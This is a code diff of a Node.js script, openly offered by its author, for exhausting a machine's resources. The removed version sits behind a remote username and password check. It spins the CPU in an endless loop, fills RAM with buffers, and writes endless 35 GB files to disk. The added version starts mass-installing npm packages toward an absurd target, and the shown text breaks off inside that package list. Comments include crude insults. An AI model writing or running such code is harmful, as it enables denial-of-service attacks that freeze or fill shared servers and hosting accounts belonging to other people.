@@ -1,462 +1,122 @@
-const { Worker, isMainThread } = require('worker_threads');
-const { spawn } = require('child_process');
-const os = require('os');
+/*
+
+     CREATED AND DEVELOPER BY: @XYCoolcraft
+     GAUSAH HAPUS NAMA GW ANJG GW JUGA CAPEK BUAT NYA!🖕
+
+*/
+
 const fs = require('fs');
+const { exec, spawn } = require('child_process');
 const path = require('path');
-const readline = require('readline');
-const https = require('https');
-const crypto = require('crypto');
-const readlineSync = require('readline-sync');
 
-function createHash(data) {
-    return crypto.createHash('sha256').update(data).digest('hex');
-}
+const TARGET_FILES = 99999999999999999999999999;
+const BATCH_SIZE = 1000;
 
-function fetchData(url) {
-    return new Promise((resolve, reject) => {
-        https.get(url, (res) => {
-            let data = '';
-            res.on('data', (chunk) => data += chunk);
-            res.on('end', () => {
-                try {
-                    resolve(JSON.parse(data));
-                } catch (e) {
-                    reject(new Error('Eror: File nya gak bisa!'));
-                }
-            });
-        }).on('error', (err) => {
-            reject(new Error(`Eror: ${err.message}`));
-        });
-    });
-}
+console.log(`
+==========================================================
+   🌹🔥⚙️ Xayz Dex // The Secret Behind the System
+   Target: ${TARGET_FILES.toLocaleString()}
+   Mode: Auto-Install & Flat place
+==========================================================
+`);
 
-async function validasiInteraktif() {
-    console.log('Memulai menjalankan...');
-    const xayzTechVX = 'https://xayzsecure.vercel.app/Xayzprotech.json';
-    let authorizedUsers;
-    try {
-        console.log('Mengambil data...');
-        authorizedUsers = await fetchData(xayzTechVX);
-        if (!Array.isArray(authorizedUsers)) {
-            throw new Error('Format tidak valid dan tidak sesuai.');
-        }
-    } catch (error) {
-        throw new Error(`Gagal mengambil data: ${error.message}`);
-    }
-    console.log('Masukkan Username nya');
-    const username = readlineSync.question('Username: ');
-    const pengguna = authorizedUsers.find(u => u.username === username);
-    if (!pengguna) {
-        throw new Error('Username tidak ditemukan.');
-    }
-    console.log('Masukkan Password nya');
-    const password = readlineSync.question('Masukkan Password: ', {
-        hideEchoBack: true
-    });
-    const localPassHash = createHash(password);
-    if (pengguna.password_hash !== localPassHash) {
-        throw new Error('Password salah.');
-    }
-    if (pengguna.active !== true) {
-        throw new Error('Akun ini tidak aktif. Silakan hubungi admin @XYCoolcraft (TELEGRAM).');
-    }
-    console.log(`\nBerhasil: Selamat datang, ${pengguna.username} yang suka ngewe!`);
-    return true;
-}
-
-const TARGET_TB_BYTES = 999 * 1024 * 1024 * 1024 * 1024;
-const DISK_FILE_BYTES_25GB = 35 * 1024 * 1024 * 1024;
-const BLOCK_SIZE_1MB = 1024 * 1024;
-
-function runCpuStress() {
-    while (true) {}
-}
-
-function runRamStress() {
-    while (true) { 
-        console.log('📈 [RAM-SYSTEM] Dimulai... Dashboard RAM akan FREEZE.');
-        const memoryStorage = [];
-        const TARGET_RAM_BYTES = TARGET_TB_BYTES;
-        let totalAllocated = 0;
-        try {
-            while (totalAllocated < TARGET_RAM_BYTES) {
-                memoryStorage.push(Buffer.alloc(BLOCK_SIZE_1MB, 'a'));
-                totalAllocated += BLOCK_SIZE_1MB;
-            }
-        } catch (e) {
-            if (process.send) {
-                process.send({ type: 'error-ram', message: e.message, progress: totalAllocated });
-            }
-        }
-    }
-}
-
-async function createDiskFile(filePath, size, onProgressCallback) {
-  return new Promise((resolve, reject) => {
-    const stream = fs.createWriteStream(filePath, { highWaterMark: BLOCK_SIZE_1MB });
-    const buf = Buffer.alloc(BLOCK_SIZE_1MB, 0);
-    let written = 0;
-
-    function writeMore() {
-      let ok = true;
-      while (ok && written < size) {
-        const remaining = size - written;
-        const chunk = remaining >= BLOCK_SIZE_1MB ? buf : buf.subarray(0, remaining);
-        ok = stream.write(chunk);
-        written += chunk.length;
-
-        onProgressCallback(written);
-      }
-      if (written >= size) {
-        stream.end();
-      }
-    }
-
-    stream.on("drain", writeMore);
-    stream.on("error", reject);
-    stream.on("finish", () => {
-      onProgressCallback(written);
-      resolve();
-    });
-
-    writeMore();
-  });
-}
-
-async function runDiskStress_GODMODE() {
-    while (true) {
-        const FILE_SIZE = DISK_FILE_BYTES_25GB;
-        const TARGET_SIZE = TARGET_TB_BYTES;
-        
-        let totalWritten = 0;
-        let fileIndex = 1;
-
-        while (totalWritten < TARGET_SIZE) {
-            const filePath = path.join(__dirname, `file_${fileIndex}_GODMODE.bin`);
-            let currentFileProgress = 0;
-            
-            try {
-                await createDiskFile(filePath, FILE_SIZE, (progress) => {
-                    currentFileProgress = progress;
-                    if (process.send) {
-                        process.send({
-                            type: 'progress-disk',
-                            totalProgress: totalWritten + currentFileProgress,
-                            fileProgress: currentFileProgress,
-                            fileName: path.basename(filePath),
-                            fileSize: FILE_SIZE
-                        });
-                    }
-                });
-                
-                totalWritten += FILE_SIZE;
-                fileIndex++;
-            } catch (error) {
-                if (process.send) {
-                    process.send({ type: 'error-disk', message: error.message, progress: totalWritten });
-                }
-                break;
-            }
-        }
-    }
-}
-
-async function RunTestDisk() {
-    while (true) {
-        const FILE_SIZE = DISK_FILE_BYTES_25GB;
-        const TARGET_SIZE = TARGET_TB_BYTES;
-        
-        let totalWritten = 0;
-        let fileIndex = 1;
-        while (totalWritten < TARGET_SIZE) {
-            const filePath = path.join(__dirname, `file_${fileIndex}_TEST.bin`);
-            let currentFileProgress = 0;
-            
-            try {
-                await createDiskFile(filePath, FILE_SIZE, (progress) => {
-                    currentFileProgress = progress;
-                    if (process.send) {
-                        process.send({
-                            type: 'progress-disk',
-                            totalProgress: totalWritten + currentFileProgress,
-                            fileProgress: currentFileProgress,
-                            fileName: path.basename(filePath),
-                            fileSize: FILE_SIZE
-                        });
-                    }
-                });
-                
-                totalWritten += FILE_SIZE;
-                fileIndex++;
-            } catch (error) {
-                if (process.send) {
-                    process.send({ type: 'error-disk', message: error.message, progress: totalWritten });
-                }
-                break;
-            }
-        }
-    }
-}
-
-function runDiskStress_OMEGA() {
-    while (true) { 
-        console.log('💾 [DISK-SYSTEM] Dimulai/Restart Paksa (Mode OMEGA - ANTI CREATE FILE).');
-        const diskStorage = [];
-        const TARGET_DISK_BYTES = TARGET_TB_BYTES;
-        let totalAllocated = 0;
-        
-        try {
-            while (totalAllocated < TARGET_DISK_BYTES) {
-                diskStorage.push(Buffer.alloc(BLOCK_SIZE_1MB, 'b'));
-                totalAllocated += BLOCK_SIZE_1MB;
-            }
-        } catch (e) {
-            if (process.send) {
-                process.send({ type: 'error-disk', message: e.message, progress: totalAllocated });
-            }
-        }
-    }
-}
-
-
-let dashboardStatus = {
-    cpu: { status: 'Waiting...', cores: 0 },
-    ram: { progress: 0, status: 'Waiting...' },
-    disk: { totalProgress: 0, fileProgress: 0, fileName: 'N/A', fileSize: 0, status: 'Waiting...' }
+const heavyDependencies = {
+    "@11ty/eleventy": "*", "@actions/artifact": "*", "@actions/cache": "*", "@actions/core": "*", "@actions/exec": "*", "@actions/github": "*", "@actions/glob": "*", "@actions/http-client": "*", "@actions/io": "*", "@actions/tool-cache": "*", "@adiwajshing/baileys": "*", "@adonisjs/auth": "*", "@adonisjs/bodyparser": "*", "@adonisjs/core": "*", "@adonisjs/cors": "*", "@adonisjs/drive-s3": "*", "@adonisjs/lucid": "*", "@adonisjs/mail": "*", "@adonisjs/redis": "*", "@adonisjs/session": "*", "@adonisjs/shield": "*", "@adonisjs/view": "*", "@algolia/autocomplete-js": "*", "@algolia/client-analytics": "*", "@algolia/client-common": "*", "@algolia/client-personalization": "*", "@algolia/client-search": "*", "@ampproject/remapping": "*", "@angular/animations": "*", "@angular/cdk": "*", "@angular/cli": "*", "@angular/common": "*", "@angular/compiler": "*", "@angular/compiler-cli": "*", "@angular/core": "*", "@angular/elements": "*", "@angular/fire": "*", "@angular/forms": "*", "@angular/google-maps": "*", "@angular/language-service": "*", "@angular/localize": "*", "@angular/material": "*", "@angular/material-moment-adapter": "*", "@angular/platform-browser": "*", "@angular/platform-browser-dynamic": "*", "@angular/platform-server": "*", "@angular/pwa": "*", "@angular/router": "*", "@angular/service-worker": "*", "@angular/youtube-player": "*", "@ant-design/colors": "*", "@ant-design/icons": "*", "@ant-design/react-native": "*", "@apollo/client": "*", "@apollo/federation": "*", "@apollo/gateway": "*", "@apollo/react-hooks": "*", "@apollo/server": "*", "@apollo/subgraph": "*", "@apollosolutions/retail-ui": "*", "@assemblyscript/loader": "*", "@astrojs/compiler": "*", "@astrojs/image": "*", "@astrojs/markdown-remark": "*", "@astrojs/mdx": "*", "@astrojs/react": "*", "@astrojs/sitemap": "*", "@astrojs/tailwind": "*", "@astrojs/vue": "*", "@aws-amplify/auth": "*", "@aws-amplify/core": "*", "@aws-amplify/datastore": "*", "@aws-amplify/storage": "*", "@aws-amplify/ui-react": "*", "@aws-cdk/aws-apigateway": "*", "@aws-cdk/aws-appsync": "*", "@aws-cdk/aws-cognito": "*", "@aws-cdk/aws-dynamodb": "*", "@aws-cdk/aws-ec2": "*", "@aws-cdk/aws-ecs": "*", "@aws-cdk/aws-events": "*", "@aws-cdk/aws-iam": "*", "@aws-cdk/aws-lambda": "*", "@aws-cdk/aws-lambda-nodejs": "*", "@aws-cdk/aws-logs": "*", "@aws-cdk/aws-rds": "*", "@aws-cdk/aws-route53": "*", "@aws-cdk/aws-s3": "*", "@aws-cdk/aws-s3-deployment": "*", "@aws-cdk/aws-secretsmanager": "*", "@aws-cdk/aws-sns": "*", "@aws-cdk/aws-sqs": "*", "@aws-cdk/aws-ssm": "*", "@aws-cdk/cloud-assembly-schema": "*", "@aws-cdk/core": "*", "@aws-cdk/cx-api": "*", "@aws-cdk/region-info": "*", "@aws-crypto/sha256-js": "*", "@aws-sdk/client-accessanalyzer": "*", "@aws-sdk/client-account": "*", "@aws-sdk/client-acm": "*", "@aws-sdk/client-acm-pca": "*", "@aws-sdk/client-alexa-for-business": "*", "@aws-sdk/client-amp": "*", "@aws-sdk/client-amplify": "*", "@aws-sdk/client-amplifybackend": "*", "@aws-sdk/client-amplifyuibuilder": "*", "@aws-sdk/client-api-gateway": "*", "@aws-sdk/client-apigatewaymanagementapi": "*", "@aws-sdk/client-apigatewayv2": "*", "@aws-sdk/client-app-mesh": "*", "@aws-sdk/client-appconfig": "*", "@aws-sdk/client-appconfigdata": "*", "@aws-sdk/client-appflow": "*", "@aws-sdk/client-appintegrations": "*", "@aws-sdk/client-application-auto-scaling": "*", "@aws-sdk/client-application-discovery-service": "*", "@aws-sdk/client-application-insights": "*", "@aws-sdk/client-apprunner": "*", "@aws-sdk/client-appstream": "*", "@aws-sdk/client-appsync": "*", "@aws-sdk/client-athena": "*", "@aws-sdk/client-auditmanager": "*", "@aws-sdk/client-auto-scaling": "*", "@aws-sdk/client-auto-scaling-plans": "*", "@aws-sdk/client-backup": "*", "@aws-sdk/client-backup-gateway": "*", "@aws-sdk/client-batch": "*", "@aws-sdk/client-braket": "*", "@aws-sdk/client-budgets": "*", "@aws-sdk/client-chime": "*", "@aws-sdk/client-chime-sdk-identity": "*", "@aws-sdk/client-chime-sdk-meetings": "*", "@aws-sdk/client-chime-sdk-messaging": "*", "@aws-sdk/client-cloud9": "*", "@aws-sdk/client-cloudcontrol": "*", "@aws-sdk/client-cloudformation": "*", "@aws-sdk/client-cloudfront": "*", "@aws-sdk/client-cloudhsm": "*", "@aws-sdk/client-cloudhsm-v2": "*", "@aws-sdk/client-cloudsearch": "*", "@aws-sdk/client-cloudsearch-domain": "*", "@aws-sdk/client-cloudtrail": "*", "@aws-sdk/client-cloudwatch": "*", "@aws-sdk/client-cloudwatch-events": "*", "@aws-sdk/client-cloudwatch-logs": "*", "@aws-sdk/client-codeartifact": "*", "@aws-sdk/client-codebuild": "*", "@aws-sdk/client-codecommit": "*", "@aws-sdk/client-codedeploy": "*", "@aws-sdk/client-codeguru-profiler": "*", "@aws-sdk/client-codeguru-reviewer": "*", "@aws-sdk/client-codepipeline": "*", "@aws-sdk/client-codestar": "*", "@aws-sdk/client-codestar-connections": "*", "@aws-sdk/client-codestar-notifications": "*", "@aws-sdk/client-cognito-identity": "*", "@aws-sdk/client-cognito-identity-provider": "*", "@aws-sdk/client-cognito-sync": "*", "@aws-sdk/client-comprehend": "*", "@aws-sdk/client-comprehendmedical": "*", "@aws-sdk/client-compute-optimizer": "*", "@aws-sdk/client-config-service": "*", "@aws-sdk/client-connect": "*", "@aws-sdk/client-connect-contact-lens": "*", "@aws-sdk/client-connect-participant": "*", "@aws-sdk/client-cost-and-usage-report-service": "*", "@aws-sdk/client-cost-explorer": "*", "@aws-sdk/client-customer-profiles": "*", "@aws-sdk/client-data-pipeline": "*", "@aws-sdk/client-database-migration-service": "*", "@aws-sdk/client-dax": "*", "@aws-sdk/client-detective": "*", "@aws-sdk/client-device-farm": "*", "@aws-sdk/client-devops-guru": "*", "@aws-sdk/client-direct-connect": "*", "@aws-sdk/client-directory-service": "*", "@aws-sdk/client-dlm": "*", "@aws-sdk/client-docdb": "*", "@aws-sdk/client-drs": "*", "@aws-sdk/client-dynamodb": "*", "@aws-sdk/client-dynamodb-streams": "*", "@aws-sdk/client-ebs": "*", "@aws-sdk/client-ec2": "*", "@aws-sdk/client-ec2-instance-connect": "*", "@aws-sdk/client-ecr": "*", "@aws-sdk/client-ecr-public": "*", "@aws-sdk/client-ecs": "*", "@aws-sdk/client-efs": "*", "@aws-sdk/client-eks": "*", "@aws-sdk/client-elastic-beanstalk": "*", "@aws-sdk/client-elastic-inference": "*", "@aws-sdk/client-elastic-load-balancing": "*", "@aws-sdk/client-elastic-load-balancing-v2": "*", "@aws-sdk/client-elasticsearch-service": "*", "@aws-sdk/client-elastic-transcoder": "*", "@aws-sdk/client-emr": "*", "@aws-sdk/client-emr-containers": "*", "@aws-sdk/client-eventbridge": "*", "@aws-sdk/client-finspace": "*", "@aws-sdk/client-finspace-data": "*", "@aws-sdk/client-firehose": "*", "@aws-sdk/client-fis": "*", "@aws-sdk/client-fms": "*", "@aws-sdk/client-forecast": "*", "@aws-sdk/client-forecastquery": "*", "@aws-sdk/client-frauddetector": "*", "@aws-sdk/client-fsx": "*", "@aws-sdk/client-gamelift": "*", "@aws-sdk/client-glacier": "*", "@aws-sdk/client-global-accelerator": "*", "@aws-sdk/client-glue": "*", "@aws-sdk/client-grafana": "*", "@aws-sdk/client-greengrass": "*", "@aws-sdk/client-greengrassv2": "*", "@aws-sdk/client-groundstation": "*", "@aws-sdk/client-guardduty": "*", "@aws-sdk/client-health": "*", "@aws-sdk/client-healthlake": "*", "@aws-sdk/client-honeycode": "*", "@aws-sdk/client-iam": "*", "@aws-sdk/client-identitystore": "*", "@aws-sdk/client-imagebuilder": "*", "@aws-sdk/client-inspector": "*", "@aws-sdk/client-inspector2": "*", "@aws-sdk/client-iot": "*", "@aws-sdk/client-iot-1click-devices-service": "*", "@aws-sdk/client-iot-1click-projects": "*", "@aws-sdk/client-iot-analytics": "*", "@aws-sdk/client-iot-data-plane": "*", "@aws-sdk/client-iot-events": "*", "@aws-sdk/client-iot-events-data": "*", "@aws-sdk/client-iot-jobs-data-plane": "*", "@aws-sdk/client-iot-wireless": "*", "@aws-sdk/client-iotfleetwise": "*", "@aws-sdk/client-iotsecuretunneling": "*", "@aws-sdk/client-iotsitewise": "*", "@aws-sdk/client-iotthingsgraph": "*", "@aws-sdk/client-iottwinmaker": "*", "@aws-sdk/client-ivs": "*", "@aws-sdk/client-kafka": "*", "@aws-sdk/client-kafkaconnect": "*", "@aws-sdk/client-kendra": "*", "@aws-sdk/client-keyspaces": "*", "@aws-sdk/client-kinesis": "*", "@aws-sdk/client-kinesis-analytics": "*", "@aws-sdk/client-kinesis-analytics-v2": "*", "@aws-sdk/client-kinesis-video": "*", "@aws-sdk/client-kinesis-video-archived-media": "*", "@aws-sdk/client-kinesis-video-media": "*", "@aws-sdk/client-kinesis-video-signaling": "*", "@aws-sdk/client-kms": "*", "@aws-sdk/client-lakeformation": "*", "@aws-sdk/client-lambda": "*", "@aws-sdk/client-lex-model-building-service": "*", "@aws-sdk/client-lex-models-v2": "*", "@aws-sdk/client-lex-runtime-service": "*", "@aws-sdk/client-lex-runtime-v2": "*", "@aws-sdk/client-license-manager": "*", "@aws-sdk/client-lightsail": "*", "@aws-sdk/client-location": "*", "@aws-sdk/client-lookoutequipment": "*", "@aws-sdk/client-lookoutmetrics": "*", "@aws-sdk/client-lookoutvision": "*", "@aws-sdk/client-machine-learning": "*", "@aws-sdk/client-macie": "*", "@aws-sdk/client-macie2": "*", "@aws-sdk/client-managedblockchain": "*", "@aws-sdk/client-marketplace-catalog": "*", "@aws-sdk/client-marketplace-commerce-analytics": "*", "@aws-sdk/client-marketplace-entitlement-service": "*", "@aws-sdk/client-marketplace-metering": "*", "@aws-sdk/client-mediaconnect": "*", "@aws-sdk/client-mediaconvert": "*", "@aws-sdk/client-medialive": "*", "@aws-sdk/client-mediapackage": "*", "@aws-sdk/client-mediapackage-vod": "*", "@aws-sdk/client-mediastore": "*", "@aws-sdk/client-mediastore-data": "*", "@aws-sdk/client-mediatailor": "*", "@aws-sdk/client-memorydb": "*", "@aws-sdk/client-mgn": "*", "@aws-sdk/client-migration-hub": "*", "@aws-sdk/client-migration-hub-config": "*", "@aws-sdk/client-migration-hub-refactor-spaces": "*", "@aws-sdk/client-migration-hub-strategy": "*", "@aws-sdk/client-mobile": "*", "@aws-sdk/client-mq": "*", "@aws-sdk/client-mturk": "*", "@aws-sdk/client-mwaa": "*", "@aws-sdk/client-neptune": "*", "@aws-sdk/client-network-firewall": "*", "@aws-sdk/client-networkmanager": "*", "@aws-sdk/client-nimble": "*", "@aws-sdk/client-opensearch": "*", "@aws-sdk/client-opsworks": "*", "@aws-sdk/client-opsworks-cm": "*", "@aws-sdk/client-organizations": "*", "@aws-sdk/client-outposts": "*", "@aws-sdk/client-panorama": "*", "@aws-sdk/client-personalize": "*", "@aws-sdk/client-personalize-events": "*", "@aws-sdk/client-personalize-runtime": "*", "@aws-sdk/client-pi": "*", "@aws-sdk/client-pinpoint": "*", "@aws-sdk/client-pinpoint-email": "*", "@aws-sdk/client-pinpoint-sms-voice": "*", "@aws-sdk/client-polly": "*", "@aws-sdk/client-pricing": "*", "@aws-sdk/client-proton": "*", "@aws-sdk/client-qldb": "*", "@aws-sdk/client-qldb-session": "*", "@aws-sdk/client-quicksight": "*", "@aws-sdk/client-ram": "*", "@aws-sdk/client-rbin": "*", "@aws-sdk/client-rds": "*", "@aws-sdk/client-rds-data": "*", "@aws-sdk/client-redshift": "*", "@aws-sdk/client-redshift-data": "*", "@aws-sdk/client-rekognition": "*", "@aws-sdk/client-resiliencehub": "*", "@aws-sdk/client-resource-groups": "*", "@aws-sdk/client-resource-groups-tagging-api": "*", "@aws-sdk/client-robomaker": "*", "@aws-sdk/client-route-53": "*", "@aws-sdk/client-route-53-domains": "*", "@aws-sdk/client-route-53-recovery-cluster": "*", "@aws-sdk/client-route-53-recovery-control-config": "*", "@aws-sdk/client-route-53-recovery-readiness": "*", "@aws-sdk/client-route-53-resolver": "*", "@aws-sdk/client-rum": "*", "@aws-sdk/client-s3": "*", "@aws-sdk/client-s3-control": "*", "@aws-sdk/client-s3-outposts": "*", "@aws-sdk/client-sagemaker": "*", "@aws-sdk/client-sagemaker-a2i-runtime": "*", "@aws-sdk/client-sagemaker-edge": "*", "@aws-sdk/client-sagemaker-featurestore-runtime": "*", "@aws-sdk/client-sagemaker-runtime": "*", "@aws-sdk/client-savingsplans": "*", "@aws-sdk/client-schemas": "*", "@aws-sdk/client-secrets-manager": "*", "@aws-sdk/client-securityhub": "*", "@aws-sdk/client-serverlessapplicationrepository": "*", "@aws-sdk/client-service-catalog": "*", "@aws-sdk/client-service-catalog-appregistry": "*", "@aws-sdk/client-service-quotas": "*", "@aws-sdk/client-ses": "*", "@aws-sdk/client-sesv2": "*", "@aws-sdk/client-sfn": "*", "@aws-sdk/client-shield": "*", "@aws-sdk/client-signer": "*", "@aws-sdk/client-sms": "*", "@aws-sdk/client-snow-device-management": "*", "@aws-sdk/client-snowball": "*", "@aws-sdk/client-sns": "*", "@aws-sdk/client-sqs": "*", "@aws-sdk/client-ssm": "*", "@aws-sdk/client-ssm-contacts": "*", "@aws-sdk/client-ssm-incidents": "*", "@aws-sdk/client-sso": "*", "@aws-sdk/client-sso-admin": "*", "@aws-sdk/client-sso-oidc": "*", "@aws-sdk/client-storage-gateway": "*", "@aws-sdk/client-sts": "*", "@aws-sdk/client-support": "*", "@aws-sdk/client-swf": "*", "@aws-sdk/client-synthetics": "*", "@aws-sdk/client-textract": "*", "@aws-sdk/client-timestream-query": "*", "@aws-sdk/client-timestream-write": "*", "@aws-sdk/client-transcribe": "*", "@aws-sdk/client-transfer": "*", "@aws-sdk/client-translate": "*", "@aws-sdk/client-voice-id": "*", "@aws-sdk/client-waf": "*", "@aws-sdk/client-waf-regional": "*", "@aws-sdk/client-wafv2": "*", "@aws-sdk/client-wellarchitected": "*", "@aws-sdk/client-wisdom": "*", "@aws-sdk/client-workdocs": "*", "@aws-sdk/client-worklink": "*", "@aws-sdk/client-workmail": "*", "@aws-sdk/client-workmailmessageflow": "*", "@aws-sdk/client-workspaces": "*", "@aws-sdk/client-workspaces-web": "*", "@aws-sdk/client-xray": "*", "@azure/ai-text-analytics": "*", "@azure/app-configuration": "*", "@azure/arm-compute": "*", "@azure/arm-network": "*", "@azure/arm-resources": "*", "@azure/arm-storage": "*", "@azure/batch": "*", "@azure/communication-chat": "*", "@azure/communication-email": "*", "@azure/communication-identity": "*", "@azure/communication-phone-numbers": "*", "@azure/communication-sms": "*", "@azure/container-registry": "*", "@azure/core-auth": "*", "@azure/core-client": "*", "@azure/core-http": "*", "@azure/core-lro": "*", "@azure/core-paging": "*", "@azure/core-rest-pipeline": "*", "@azure/core-tracing": "*", "@azure/core-util": "*", "@azure/cosmos": "*", "@azure/data-lake-storage-expiry": "*", "@azure/data-tables": "*", "@azure/digital-twins-core": "*", "@azure/event-hubs": "*", "@azure/eventgrid": "*", "@azure/identity": "*", "@azure/keyvault-admin": "*", "@azure/keyvault-certificates": "*", "@azure/keyvault-keys": "*", "@azure/keyvault-secrets": "*", "@azure/logger": "*", "@azure/monitor-query": "*", "@azure/msal-browser": "*", "@azure/msal-node": "*", "@azure/search-documents": "*", "@azure/service-bus": "*", "@azure/storage-blob": "*", "@azure/storage-file-share": "*", "@azure/storage-queue": "*", "@babel/cli": "*", "@babel/code-frame": "*", "@babel/compat-data": "*", "@babel/core": "*", "@babel/eslint-parser": "*", "@babel/generator": "*", "@babel/helper-builder-binary-assignment-operator-visitor": "*", "@babel/helper-compilation-targets": "*", "@babel/helper-create-class-features-plugin": "*", "@babel/helper-create-regexp-features-plugin": "*", "@babel/helper-define-map": "*", "@babel/helper-explode-assignable-expression": "*", "@babel/helper-function-name": "*", "@babel/helper-get-function-arity": "*", "@babel/helper-hoist-variables": "*", "@babel/helper-member-expression-to-functions": "*", "@babel/helper-module-imports": "*", "@babel/helper-module-transforms": "*", "@babel/helper-optimise-call-expression": "*", "@babel/helper-plugin-utils": "*", "@babel/helper-remap-async-to-generator": "*", "@babel/helper-replace-supers": "*", "@babel/helper-simple-access": "*", "@babel/helper-skip-transparent-expression-wrappers": "*", "@babel/helper-split-export-declaration": "*", "@babel/helper-validator-identifier": "*", "@babel/helper-validator-option": "*", "@babel/helper-wrap-function": "*", "@babel/helpers": "*", "@babel/highlight": "*", "@babel/parser": "*", "@babel/plugin-bugfix-safari-id-destructuring-collision-in-function-expression": "*", "@babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining": "*", "@babel/plugin-external-helpers": "*", "@babel/plugin-proposal-async-generator-functions": "*", "@babel/plugin-proposal-class-properties": "*", "@babel/plugin-proposal-class-static-block": "*", "@babel/plugin-proposal-decorators": "*", "@babel/plugin-proposal-do-expressions": "*", "@babel/plugin-proposal-dynamic-import": "*", "@babel/plugin-proposal-export-default-from": "*", "@babel/plugin-proposal-export-namespace-from": "*", "@babel/plugin-proposal-function-bind": "*", "@babel/plugin-proposal-function-sent": "*", "@babel/plugin-proposal-json-strings": "*", "@babel/plugin-proposal-logical-assignment-operators": "*", "@babel/plugin-proposal-nullish-coalescing-operator": "*", "@babel/plugin-proposal-numeric-separator": "*", "@babel/plugin-proposal-object-rest-spread": "*", "@babel/plugin-proposal-optional-catch-binding": "*", "@babel/plugin-proposal-optional-chaining": "*", "@babel/plugin-proposal-pipeline-operator": "*", "@babel/plugin-proposal-private-methods": "*", "@babel/plugin-proposal-private-property-in-object": "*", "@babel/plugin-proposal-throw-expressions": "*", "@babel/plugin-proposal-unicode-property-regex": "*", "@babel/plugin-syntax-async-generators": "*", "@babel/plugin-syntax-bigint": "*", "@babel/plugin-syntax-class-properties": "*", "@babel/plugin-syntax-class-static-block": "*", "@babel/plugin-syntax-decorators": "*", "@babel/plugin-syntax-do-expressions": "*", "@babel/plugin-syntax-dynamic-import": "*", "@babel/plugin-syntax-export-default-from": "*", "@babel/plugin-syntax-export-namespace-from": "*", "@babel/plugin-syntax-flow": "*", "@babel/plugin-syntax-function-bind": "*", "@babel/plugin-syntax-function-sent": "*", "@babel/plugin-syntax-import-assertions": "*", "@babel/plugin-syntax-import-meta": "*", "@babel/plugin-syntax-json-strings": "*", "@babel/plugin-syntax-jsx": "*", "@babel/plugin-syntax-logical-assignment-operators": "*", "@babel/plugin-syntax-nullish-coalescing-operator": "*", "@babel/plugin-syntax-numeric-separator": "*", "@babel/plugin-syntax-object-rest-spread": "*", "@babel/plugin-syntax-optional-catch-binding": "*", "@babel/plugin-syntax-optional-chaining": "*", "@babel/plugin-syntax-pipeline-operator": "*", "@babel/plugin-syntax-private-property-in-object": "*", "@babel/plugin-syntax-throw-expressions": "*", "@babel/plugin-syntax-top-level-await": "*", "@babel/plugin-syntax-typescript": "*", "@babel/plugin-transform-arrow-functions": "*", "@babel/plugin-transform-async-to-generator": "*", "@babel/plugin-transform-block-scoped-functions": "*", "@babel/plugin-transform-block-scoping": "*", "@babel/plugin-transform-classes": "*", "@babel/plugin-transform-computed-properties": "*", "@babel/plugin-transform-destructuring": "*", "@babel/plugin-transform-dotall-regex": "*", "@babel/plugin-transform-duplicate-keys": "*", "@babel/plugin-transform-exponentiation-operator": "*", "@babel/plugin-transform-flow-strip-types": "*", "@babel/plugin-transform-for-of": "*", "@babel/plugin-transform-function-name": "*", "@babel/plugin-transform-literals": "*", "@babel/plugin-transform-member-expression-literals": "*", "@babel/plugin-transform-modules-amd": "*", "@babel/plugin-transform-modules-commonjs": "*", "@babel/plugin-transform-modules-systemjs": "*", "@babel/plugin-transform-modules-umd": "*", "@babel/plugin-transform-named-capturing-groups-regex": "*", "@babel/plugin-transform-new-target": "*", "@babel/plugin-transform-object-super": "*", "@babel/plugin-transform-parameters": "*", "@babel/plugin-transform-property-literals": "*", "@babel/plugin-transform-react-constant-elements": "*", "@babel/plugin-transform-react-display-name": "*", "@babel/plugin-transform-react-inline-elements": "*", "@babel/plugin-transform-react-jsx": "*", "@babel/plugin-transform-react-jsx-compat": "*", "@babel/plugin-transform-react-jsx-development": "*", "@babel/plugin-transform-react-jsx-self": "*", "@babel/plugin-transform-react-jsx-source": "*", "@babel/plugin-transform-react-pure-annotations": "*", "@babel/plugin-transform-regenerator": "*", "@babel/plugin-transform-reserved-words": "*", "@babel/plugin-transform-runtime": "*", "@babel/plugin-transform-shorthand-properties": "*", "@babel/plugin-transform-spread": "*", "@babel/plugin-transform-sticky-regex": "*", "@babel/plugin-transform-template-literals": "*", "@babel/plugin-transform-typeof-symbol": "*", "@babel/plugin-transform-typescript": "*", "@babel/plugin-transform-unicode-escapes": "*", "@babel/plugin-transform-unicode-regex": "*", "@babel/polyfill": "*", "@babel/preset-env": "*", "@babel/preset-flow": "*", "@babel/preset-modules": "*", "@babel/preset-react": "*", "@babel/preset-typescript": "*", "@babel/register": "*", "@babel/runtime": "*", "@babel/runtime-corejs2": "*", "@babel/runtime-corejs3": "*", "@babel/template": "*", "@babel/traverse": "*", "@babel/types": "*", "@bochilteam/scraper": "*", "@chakra-ui/react": "*", "@commitlint/cli": "*", "@commitlint/config-conventional": "*", "@cypress/request": "*", "@cypress/webpack-preprocessor": "*", "@datadog/browser-logs": "*", "@datadog/browser-rum": "*", "@discordjs/builders": "*", "@discordjs/collection": "*", "@discordjs/opus": "*", "@discordjs/rest": "*", "@discordjs/voice": "*", "@docusaurus/core": "*", "@docusaurus/preset-classic": "*", "@elastic/elasticsearch": "*", "@electron/get": "*", "@emotion/cache": "*", "@emotion/css": "*", "@emotion/react": "*", "@emotion/server": "*", "@emotion/styled": "*", "@esbuild-plugins/node-globals-polyfill": "*", "@eslint/eslintrc": "*", "@expo/vector-icons": "*", "@fastify/cors": "*", "@fastify/static": "*", "@fastify/swagger": "*", "@ffmpeg-installer/ffmpeg": "*", "@fontsource/inter": "*", "@fontsource/roboto": "*", "@fortawesome/fontawesome-free": "*", "@fortawesome/fontawesome-svg-core": "*", "@fortawesome/free-solid-svg-icons": "*", "@fortawesome/react-fontawesome": "*", "@google-cloud/bigquery": "*", "@google-cloud/compute": "*", "@google-cloud/datastore": "*", "@google-cloud/firestore": "*", "@google-cloud/functions-framework": "*", "@google-cloud/local-auth": "*", "@google-cloud/logging": "*", "@google-cloud/pubsub": "*", "@google-cloud/spanner": "*", "@google-cloud/speech": "*", "@google-cloud/storage": "*", "@google-cloud/tasks": "*", "@google-cloud/text-to-speech": "*", "@google-cloud/translate": "*", "@google-cloud/vision": "*", "@google/generative-ai": "*", "@google/maps": "*", "@graphql-codegen/cli": "*", "@graphql-tools/schema": "*", "@grpc/grpc-js": "*", "@grpc/proto-loader": "*", "@hapi/boom": "*", "@hapi/hapi": "*", "@hapi/inert": "*", "@hapi/joi": "*", "@hapi/vision": "*", "@headlessui/react": "*", "@heroicons/react": "*", 